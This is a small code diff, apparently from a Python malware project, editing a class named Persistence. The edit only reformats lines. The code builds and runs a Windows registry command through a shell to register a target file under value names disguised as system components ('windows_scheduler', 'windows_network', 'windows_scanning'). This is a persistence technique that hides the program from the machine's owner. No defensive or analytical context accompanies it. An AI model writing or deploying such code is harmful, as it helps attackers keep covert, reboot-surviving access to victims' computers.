@@ -24,7 +24,7 @@ class Persistence:
                                         " /v windows_scheduler",
                                         " /v windows_network",
                                         " /v windows_scanning"
-                                    ] 
+        ] 
         self.targetRegisterType         = " /t REG_SZ"
         self.RegisterVersionALreadyUsed = []
 
@@ -52,7 +52,8 @@ class Persistence:
                                             if version != targetRegisterVersion:
                                                 break
 
-                                subprocess.run(self.targetRegisterPath + targetRegisterVersion + self.targetRegisterType + targetFile, shell=True, timeout=3)
+                                subprocess.run(self.targetRegisterPath + targetRegisterVersion + \
+                                    self.targetRegisterType + targetFile, shell=True, timeout=3)
                             else:
                                 return ERROR_FILE_EMPTY
                         else:
